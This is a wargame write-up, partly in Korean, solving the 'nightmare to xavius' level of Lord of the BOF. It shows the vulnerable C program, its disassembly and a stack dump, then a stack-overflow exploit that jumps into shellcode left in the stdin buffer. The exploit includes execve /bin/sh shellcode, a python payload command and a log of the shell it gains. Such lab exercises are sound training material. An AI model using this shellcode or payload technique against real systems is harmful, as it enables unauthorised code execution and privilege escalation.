# Level 18, Nightmare -> Xavius

## xavius.c

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - xavius
        - arg
*/

#include <stdio.h>
#include <stdlib.h>
#include <dumpcode.h>

main()
{
        char buffer[40];
        char *ret_addr;

        // overflow!
        fgets(buffer, 256, stdin);
        printf("%s\n", buffer);

        if(*(buffer+47) == '\xbf')
        {
                printf("stack retbayed you!\n");
                exit(0);
        }

        if(*(buffer+47) == '\x08')
        {
                printf("binary image retbayed you, too!!\n");
                exit(0);
        }

        // check if the ret_addr is library function or not
        memcpy(&ret_addr, buffer+44, 4);
        while(memcmp(ret_addr, "\x90\x90", 2) != 0)     // end point of function
        {
                if(*ret_addr == '\xc9'){                // leave
                        if(*(ret_addr+1) == '\xc3'){    // ret
                                printf("You cannot use library function!\n");
                                exit(0);
                        }
                }
                ret_addr++;
        }

        // stack destroyer
        memset(buffer, 0, 44);
        memset(buffer+48, 0, 0xbfffffff - (int)(buffer+48));

        // LD_* eraser
        // 40 : extra space for memset function
        memset(buffer-3000, 0, 3000-40);
}
```

## Analysis

### Disassembling the "xavius"

```sh
Dump of assembler code for function main:
0x8048714 <main>:       push   %ebp
0x8048715 <main+1>:     mov    %ebp,%esp
0x8048717 <main+3>:     sub    %esp,44
0x804871a <main+6>:     mov    %eax,%ds:0x8049a3c
0x804871f <main+11>:    push   %eax
0x8048720 <main+12>:    push   0x100
0x8048725 <main+17>:    lea    %eax,[%ebp-40]
0x8048728 <main+20>:    push   %eax
0x8048729 <main+21>:    call   0x8048408 <fgets>
0x804872e <main+26>:    add    %esp,12
0x8048731 <main+29>:    lea    %eax,[%ebp-40]
0x8048734 <main+32>:    push   %eax
0x8048735 <main+33>:    push   0x80488bb
0x804873a <main+38>:    call   0x8048438 <printf>
0x804873f <main+43>:    add    %esp,8
0x8048742 <main+46>:    cmp    BYTE PTR [%ebp+7],0xbf
0x8048746 <main+50>:    jne    0x8048760 <main+76>
0x8048748 <main+52>:    push   0x80488bf
0x804874d <main+57>:    call   0x8048438 <printf>
0x8048752 <main+62>:    add    %esp,4
0x8048755 <main+65>:    push   0
0x8048757 <main+67>:    call   0x8048458 <exit>
0x804875c <main+72>:    add    %esp,4
0x804875f <main+75>:    nop
0x8048760 <main+76>:    cmp    BYTE PTR [%ebp+7],0x8
0x8048764 <main+80>:    jne    0x8048780 <main+108>
0x8048766 <main+82>:    push   0x80488e0
0x804876b <main+87>:    call   0x8048438 <printf>
0x8048770 <main+92>:    add    %esp,4
0x8048773 <main+95>:    push   0
0x8048775 <main+97>:    call   0x8048458 <exit>
0x804877a <main+102>:   add    %esp,4
0x804877d <main+105>:   lea    %esi,[%esi]
0x8048780 <main+108>:   push   4
0x8048782 <main+110>:   lea    %eax,[%ebp-40]
0x8048785 <main+113>:   lea    %edx,[%eax+44]
0x8048788 <main+116>:   push   %edx
0x8048789 <main+117>:   lea    %eax,[%ebp-44]
0x804878c <main+120>:   push   %eax
0x804878d <main+121>:   call   0x8048448 <memcpy>
0x8048792 <main+126>:   add    %esp,12
0x8048795 <main+129>:   push   2
0x8048797 <main+131>:   push   0x8048902
0x804879c <main+136>:   mov    %eax,DWORD PTR [%ebp-44]
0x804879f <main+139>:   push   %eax
0x80487a0 <main+140>:   call   0x8048418 <memcmp>
0x80487a5 <main+145>:   add    %esp,12
0x80487a8 <main+148>:   mov    %eax,%eax
0x80487aa <main+150>:   test   %eax,%eax
0x80487ac <main+152>:   jne    0x80487b0 <main+156>
0x80487ae <main+154>:   jmp    0x80487e0 <main+204>
0x80487b0 <main+156>:   mov    %eax,DWORD PTR [%ebp-44]
0x80487b3 <main+159>:   cmp    BYTE PTR [%eax],0xc9
0x80487b6 <main+162>:   jne    0x80487d8 <main+196>
0x80487b8 <main+164>:   mov    %eax,DWORD PTR [%ebp-44]
0x80487bb <main+167>:   inc    %eax
0x80487bc <main+168>:   cmp    BYTE PTR [%eax],0xc3
0x80487bf <main+171>:   jne    0x80487d8 <main+196>
0x80487c1 <main+173>:   push   0x8048920
0x80487c6 <main+178>:   call   0x8048438 <printf>
0x80487cb <main+183>:   add    %esp,4
0x80487ce <main+186>:   push   0
0x80487d0 <main+188>:   call   0x8048458 <exit>
0x80487d5 <main+193>:   add    %esp,4
0x80487d8 <main+196>:   inc    DWORD PTR [%ebp-44]
0x80487db <main+199>:   jmp    0x8048795 <main+129>
0x80487dd <main+201>:   lea    %esi,[%esi]
0x80487e0 <main+204>:   push   44
0x80487e2 <main+206>:   push   0
0x80487e4 <main+208>:   lea    %eax,[%ebp-40]
0x80487e7 <main+211>:   push   %eax
0x80487e8 <main+212>:   call   0x8048468 <memset>
0x80487ed <main+217>:   add    %esp,12
0x80487f0 <main+220>:   lea    %eax,[%ebp-40]
0x80487f3 <main+223>:   mov    %edx,0xbfffffcf
0x80487f8 <main+228>:   mov    %ecx,%edx
0x80487fa <main+230>:   sub    %ecx,%eax
0x80487fc <main+232>:   mov    %eax,%ecx
0x80487fe <main+234>:   push   %eax
0x80487ff <main+235>:   push   0
0x8048801 <main+237>:   lea    %eax,[%ebp-40]
0x8048804 <main+240>:   lea    %edx,[%eax+48]
0x8048807 <main+243>:   push   %edx
0x8048808 <main+244>:   call   0x8048468 <memset>
0x804880d <main+249>:   add    %esp,12
0x8048810 <main+252>:   push   0xb90
0x8048815 <main+257>:   push   0
0x8048817 <main+259>:   lea    %eax,[%ebp-40]
0x804881a <main+262>:   lea    %edx,[%eax-3000]
0x8048820 <main+268>:   push   %edx
0x8048821 <main+269>:   call   0x8048468 <memset>
0x8048826 <main+274>:   add    %esp,12
0x8048829 <main+277>:   leave
0x804882a <main+278>:   ret
```

### Estimated Stack Structure

```sh
|  char *ret_addr       | [%ebp-44]
|  char buffer[40]      | [%ebp-40]
|  SFP                  | [%ebp]
|  RET                  | [%ebp+4]
|  ARGC                 | [%ebp+8]
|  Pointer to ARGV[0]   | [%ebp+12]
```

### Observed Stack Structure (bp at *main+46)

```sh
Starting program: /home/nightmare/xavius-cp
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA


Breakpoint 1, 0x8048742 in main ()
(gdb) x/100x $esp
0xbffffacc:     0x40021ca0      0x41414141      0x41414141      0x41414141  -> *ret_addr, buffer[40]
0xbffffadc:     0x41414141      0x41414141      0x41414141      0x41414141  -> buffer[40]
0xbffffaec:     0x41414141      0x41414141      0x41414141      0xbfff000a  -> buffer[40], SFP
0xbffffafc:     0x400309cb      0x00000001      0xbffffb44      0xbffffb4c  -> RET, ARGC, &ARGV[0], &ARGV[1]
0xbffffb0c:     0x40013868      0x00000001      0x08048480      0x00000000
0xbffffb1c:     0x080484a1      0x08048714      0x00000001      0xbffffb44
0xbffffb2c:     0x08048398      0x0804885c      0x4000ae60      0xbffffb3c
0xbffffb3c:     0x40013e90      0x00000001      0xbffffc42      0x00000000
0xbffffb4c:     0xbffffc5c      0xbffffc70      0xbffffc89      0xbffffca8
0xbffffb5c:     0xbffffcca      0xbffffcd9      0xbffffe9c      0xbffffebb
0xbffffb6c:     0xbffffeda      0xbffffeef      0xbfffff10      0xbfffff1b
0xbffffb7c:     0xbfffff2d      0xbfffff35      0xbfffff46      0xbfffff50
0xbffffb8c:     0xbfffff5e      0xbfffff6f      0xbfffff7d      0xbfffff88
0xbffffb9c:     0xbfffff9d      0x00000000      0x00000003      0x08048034
0xbffffbac:     0x00000004      0x00000020      0x00000005      0x00000006
0xbffffbbc:     0x00000006      0x00001000      0x00000007      0x40000000
0xbffffbcc:     0x00000008      0x00000000      0x00000009      0x08048480
0xbffffbdc:     0x0000000b      0x00000206      0x0000000c      0x00000206
0xbffffbec:     0x0000000d      0x00000206      0x0000000e      0x00000206
0xbffffbfc:     0x00000010      0x0fabfbff      0x0000000f      0xbffffc3d
0xbffffc0c:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffc1c:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffc2c:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffc3c:     0x38366900      0x682f0036      0x2f656d6f      0x6867696e
0xbffffc4c:     0x72616d74      0x61782f65      0x73756976      0x0070632d
```

## Exploit

### How to pwn

`%ds:0x8049a3c`에 위치한 STDIN을 사용하자! 이 코드는 스택 영역, 코드 영역, 그외 라이브러리 영역을 사용하지 못하게 하지만, STDIN으로 받기 때문에 입력받은 데이터가 STDIN에 남아있게 된다. 

```asm
0x804871a <main+6>:     mov    %eax,%ds:0x8049a3c
```

이건 `fgets`로 stdin에서 buffer로 데이터를 받아올때 스택이 푸시하는 stdin 값이다. 이걸 따라가면 stdin `_IO_FILE` 구조체가 나오는데, 여기에 입력받은 데이터가 시작하는 포인터, 끝나는 포인터 등 다양한 정보가 존재한다. 

실행흐름을 스택이나 코드영역으로 넘길 수 없기 때문에, STDIN으로 쉘코드를 넣은후 그 쪽으로 실행흐름을 넘기면 간단하게 해결할 수 있다.

[STDIN에 대해 더 알고 싶으면](http://hacksg.tistory.com/35)

### Shellcode (24 bytes)

```sh
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```

### Final Payload

```sh
python -c "print 'A'*44+'\x30\x50\x01\x40'+'\x90'*100+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'" > payload.txt

(cat payload; cat) | ./xavius
```

## Result

```sh
[nightmare@localhost nightmare]$ python -c "print 'A'*44+'\x30\x50\x01\x40'+'\x90'*100+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'" > payload.txt

[nightmare@localhost nightmare]$ (cat payload.txt; cat) | ./xavius
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0P@▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒1▒Ph//shh/bin▒▒PS▒ᙰ
      ̀

id
uid=518(nightmare) gid=518(nightmare) euid=519(xavius) egid=519(xavius) groups=518(nightmare)
my-pass
euid = 519
throw me away
```